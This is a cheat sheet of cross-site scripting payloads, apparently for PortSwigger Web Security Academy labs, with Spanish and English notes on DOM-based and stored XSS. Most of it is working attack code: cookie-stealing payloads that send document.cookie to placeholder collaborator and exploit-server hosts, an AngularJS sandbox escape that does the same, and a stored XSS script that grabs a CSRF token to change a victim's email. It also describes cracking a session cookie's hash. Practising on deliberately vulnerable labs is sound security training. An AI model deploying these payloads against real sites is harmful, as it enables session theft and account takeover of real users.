---

---
---

#### Payloads: 

```js
//LAB: DOM XSS sink:document.write with source:location.search (inside img)
"><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

//LAB: DOM XSS <select> sink:document.write source:location.search</select></option>
...productId=1&storeId=</select></option><svg onload="alert(1)"/>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(Pwn3d_By_JF0x0r)"/>
//Solucion lab: 
	"></select><img%20src=1%20onerror=alert(1)>

//LAB: DOM XSS sink:InnerHTML source:location.search
/?search="><img src='x' onerror=alert('Pwn3d_By_JF0x0r');>

//LAB: DOM XSS sink:href source:location.search in JQuery
?returnPath=javascript:alert(document.cookie)
?returnPath=javascript:fetch('https://your-burp-collaborator.com/?c='+document.cookie)

//LAB: DOM XSS JQuery sink:selector - hashchange event
// store & deliver exploit to victim
<iframe src="URL-vulnerable/#" onload="this.src+='<img src=x onerror=print()>'"></iframe >

//LAB: DOM XSS Angular 1.7.7 JS: (<>," ") codificadas a HTML
/?search={{constructor}} //testing {{7*7}} también.
?search={{constructor.constructor('alert(1)')()}}
//PARA ROBAR COOKIE ->
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
//Y si funciona sería simplemente hacer un script document.location con la url de search junto con el payload xss y deliver exploit to victim para robarlo la cookie y que nos llegue a nuestro collab!!


//html.replace('<', '&lt;').replace('>', '&gt;'); in a string, single occurrence Comment POST author vulnerable, revision del codigo JS que contiene un InnerHTML
<><img src=x onerror=alert(1)>

//More Elaborated DOM 
\"}-alert(1)//
"}; location="https://EXPLOIT-SERVER.net/c?"+document.cookie; //

```
### 3. XSS Stored: 

Los scripts entre sitios almacenados (también conocidos como XSS de segundo orden o persistentes) surgen cuando una aplicación recibe datos de una fuente que no es confiable e incluye esos datos dentro de sus respuestas HTTP posteriores de manera insegura.

```js
//LAB: De authentication topic pero lo dejo acá tambien `stay-logged-in`
//### Autentication password cracking online: `stay-logged-in`
<script>document.location='https://exploit-SERVER/'+document.cookie</script>
//Nos llega la cookie de session y simplemente la decodeamos como sea necesario, base64>md5>take password. ----->*** Si el hash no se desencripta con alguna tool, busco directamente el hash en internet a ver si aparece. 
* Si el hash no se desencripta con alguna tool, busco directamente el hash en internet a ver si aparece. 


//LAB: XSS Stored en contexto HTML sin nada codificado
//en la seccion de comentar, en comment tirar: 
<script>alert()</script>

//LAB: XSS Stored onClick Event, <>," " HTML Encoded & '', \ Escaped
//* en la seccion de comentar el body param website: 
//* carga util sin codear: &apos;-alert(document.domain)-&apos;
//* '-alert(document.domain)-'
&website=https://%26%61%70%6f%73%3b%2d%61%6c%65%72%74%28%31%29%2d%26%61%70%6f%73%3b.com

//LAB: XSS Stored href " " encoded HTML
//en el param body website: 
javascript:alert('Pwn3d_By_JF0x0r')

//LAB: XSS Stored Base DOM
//en el param body de Author/name o en comment. 
<><img src=x onerror=alert('Pwn3d_By_JF0x0r');>  //testing
<><img src=https://ID-LAB.web-security-academy.net/post?postId=9 onerror=alert(1);> //payload FINAL. 
<><img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror=this.src'https://COLLAB.com/?cook='+document.cookie;>

//LAB: XSS Stored + CSRF
//La seccion de comments es la vulnerable. 
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() { 
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
	var changeReq = new XMLHttpRequest(); 
	changeReq.open('post', '/my-account/change-email', true);
	changeReq.send('csrf='+token+'&email=test@test.com') 
}; 
</script>

```